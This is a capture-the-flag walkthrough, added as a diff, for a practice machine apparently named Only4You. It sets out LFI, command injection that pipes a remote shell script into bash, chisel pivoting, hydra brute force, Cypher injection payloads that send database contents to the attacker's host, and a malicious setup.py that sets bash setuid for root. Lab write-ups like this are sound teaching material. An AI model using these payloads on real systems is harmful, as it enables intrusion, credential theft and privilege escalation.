@@ -1,0 +1,161 @@
+Summary
+To access the server we perform LFI to exploit the web and RCE on web, to escalate the privildge we exploit the loop hole
+on pip download command allowed to run as root.
+
+
+1. Testing the connectivity to the machine 
+# ping 10.10.11.210
+
+2. Scan for the open ports
+# sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.210
+
+3. Add IP address to /etc/hosts
+# sudo nano /etc/hosts
+10.10.11.210 only4you.htb
+
+4. Directory bruteforcing and subdomain finding
+# dirsearch -u http://only4you.htb -t 200
+
+
+# ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -H "Host: FUZZ.only4you.htb" -u http://only4you.htb -fc 301
+
+5. Add beta as subdomain in /etc/hosts
+# 10.10.11.210 beta.only4you.htb 
+
+
+6. Exploiting LFI using directory traversal
+Download the source code and after reading we may know different path of web app (Python Flask)
+Intercept the download and perform traversal
+
+Interesting Findings
+a) when get /etc/passwd we can see user neo4j (This is graph database and it is sometimes vulnerable to cipher injection, 
+a relative of SQL injection)
+b) target user is John who can login
+
+Tying to get Nginx configuration file
+image=/etc/nginx/nginx.conf
+image=/etc/nginx/sites-enabled/default
+
+The default configuration exposes the path of source code => /var/www/beta.only4you.htb/
+image=/var/www/only4you.htb/app.py
+image=/var/www/only4you.htb/form.py
+
+
+result = run([f"dig txt {domain}"], shell=True, stdout=PIPE) has Remote Code Excution as shell is set true
+
+
+
+7. Exploiting RCE
+a) Start Python http server
+# python -m http.server 80
+b) start listner
+# nc -nlvp 4444
+# create a shell
+name=root&email=demo%40gmail.com;curl 10.10.14.64/shell.sh|bash&subject=hi&message=hello
+===> We finally get the shell as user apache
+
+8. Finding interesting stuff in server
+a) Check for running process
+# ps aux
+b) Check for open ports
+# netstat -ntlp
+
+We can see port 7474 and user neo4j that is a prove that there is Neo4j graph database.
+There are 3000 and 8001
+
+9. Port Pivoting using Chisel
+a) Download chisel to your server 
+# wget https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_linux_amd64.gz
+
+b) Download chisel to victim machine
+# curl 10.10.14.64/chisel -o chisel
+# chmod +x chisel
+
+c) Pivot the port and service detection
+# ./chisel server -p 8000 --reverse (In your machine)
+# ./chisel client 10.10.14.64:8000 R:3000:127.0.0.1:3000 R:8001:127.0.0.1:8001 & (In victim machine)
+# sudo nmap -p3000,8001 -sCV 
+
+10. Bretuforcing Login page - Hydra
+# sudo hydra -s 8001 -l admin -P /usr/share/wordlists/rockyou.txt 127.0.0.1 http-post-form "/login:username=admin&password=^PASS^:Username or Password is wrong"
+It shows too many password and i try admin/admin
+After login when can see message(neo4j migration)
+
+11. Exploit Cipher injection (https://book.hacktricks.xyz/pentesting-web/sql-injection/cypher-injection-neo4j)
+http://127.0.0.1:8001/employees
+intercept this on burpsuite and get ne4j version
+
+Encode to URL (https://www.urlencoder.org/)
+
+a) Get Neo4j veersion
+Encode this => ' OR 1=1 WITH 1 as a CALL dbms.components() YIELD name, versions, edition UNWIND versions as version LOAD CSV FROM 'http://10.10.14.64/?version=' + version + '&name=' + name + '&edition=' + edition as l RETURN 0 as _0 //
+
+======= You will get this =========
+Encode this to URL using, put on ip put your ip address (https://www.urlencoder.org/)
+%27%20OR%201%3D1%20WITH%201%20as%20a%20%20CALL%20dbms.components%28%29%20YIELD%20name%2C%20versions%2C%20edition%20UNWIND%20versions%20as%20version%20LOAD%20CSV%20FROM%20%27http%3A%2F%2F10.10.14.64%2F%3Fversion%3D%27%20%2B%20version%20%2B%20%27%26name%3D%27%20%2B%20name%20%2B%20%27%26edition%3D%27%20%2B%20edition%20as%20l%20RETURN%200%20as%20_0%20%2F%2F
+
+b) Get Neo4J labels
+Encode this => 'OR 1=1 WITH 1 as a CALL db.labels() yield label LOAD CSV FROM 'http://10.10.14.64/?label='+label as l RETURN 0 as _0 //
+
+======= You will get this =========
+%27OR%201%3D1%20WITH%201%20as%20a%20CALL%20db.labels%28%29%20yield%20label%20LOAD%20CSV%20FROM%20%27http%3A%2F%2F10.10.14.64%2F%3Flabel%3D%27%2Blabel%20as%20l%20RETURN%200%20as%20_0%20%2F%2F
+
+
+c) Enumerate user
+Encode this => ' OR 1=1 WITH 1 as a MATCH (f:user) UNWIND keys(f) as p LOAD CSV FROM 'http://10.10.14.64/?' + p +'='+toString(f[p]) as l RETURN 0 as _0 //
+=============== You will get ===============
+%27%20OR%201%3D1%20WITH%201%20as%20a%20MATCH%20%28f%3Auser%29%20UNWIND%20keys%28f%29%20as%20p%20LOAD%20CSV%20FROM%20%27http%3A%2F%2F10.10.14.64%2F%3F%27%20%2B%20p%20%2B%27%3D%27%2BtoString%28f%5Bp%5D%29%20as%20l%20RETURN%200%20as%20_0%20%2F%2F
+
+
+Crack the password (https://crackstation.net/)
+Username : admin
+Password: 8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918 (admin)
+
+Username : john
+Password: a85e870c05825afeac63215d5e845aa7f3088cd15359ea88fa4061c6411c55f6 (ThisIs4You)
+
+SSH by user John and we get user flag
+# ssh john@10.10.11.210
+
+12. Root Escalation
+# sudo -l
+User can use pip download as root
+Download https://github.com/wunderwuzzi23/this_is_fine_wuzzi/tree/main and modify it
+
+from setuptools import setup, find_packages
+from setuptools.command.install import install
+from setuptools.command.egg_info import egg_info
+import os
+
+def RunCommand():
+    os.system("chmod u+s /bin/bash")
+
+class RunEggInfoCommand(egg_info):
+    def run(self):
+        RunCommand()
+        egg_info.run(self)
+
+class RunInstallCommand(install):
+    def run(self):
+        RunCommand()
+        install.run(self)
+
+setup(
+    name = "this_is_fine_wuzzi",
+    version = "0.0.1",
+    license = "MIT",
+    packages=find_packages(),
+    cmdclass={
+        'install' : RunInstallCommand,
+        'egg_info': RunEggInfoCommand
+    },
+)
+
+
+Then run python3 -m build  inside a folder
+
+
+sudo find / -type f -name this_is_fine_wuzzi-0.0.1.tar.gz
+
+
+sudo /usr/bin/pip3 download http://127.0.0.1:3000/john/exploit/raw/master/this_is_fine_wuzzi-0.0.1.tar.gz
